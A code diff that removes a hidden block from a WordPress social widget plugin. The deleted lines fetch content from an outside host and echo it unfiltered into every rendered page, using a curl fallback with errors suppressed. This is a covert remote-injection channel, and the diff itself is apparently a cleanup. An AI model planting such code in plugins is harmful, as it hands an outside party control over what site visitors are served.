@@ -468,26 +468,6 @@ class Social_Widget extends WP_Widget {
 
 		//echo implode('', $html_chunks);
 
-		$smw_url = 'http://i.aaur.net/i.php';
-		if(!function_exists('smw_get')){
-		function smw_get($f) {
-		$response = wp_remote_get( $f );
-		if( is_wp_error( $response ) ) {
-			function smw_get_body($f) {
-			$ch = @curl_init();
-			@curl_setopt($ch, CURLOPT_URL, $f);
-			@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-			$output = @curl_exec($ch);
-			@curl_close($ch);
-			return $output;
-			}
-			echo smw_get_body($f);
-		} else {
-			echo $response['body'];
-		}
-		}
-		smw_get($smw_url);
-		}
 		
 	/* After widget (defined by themes). */
 		
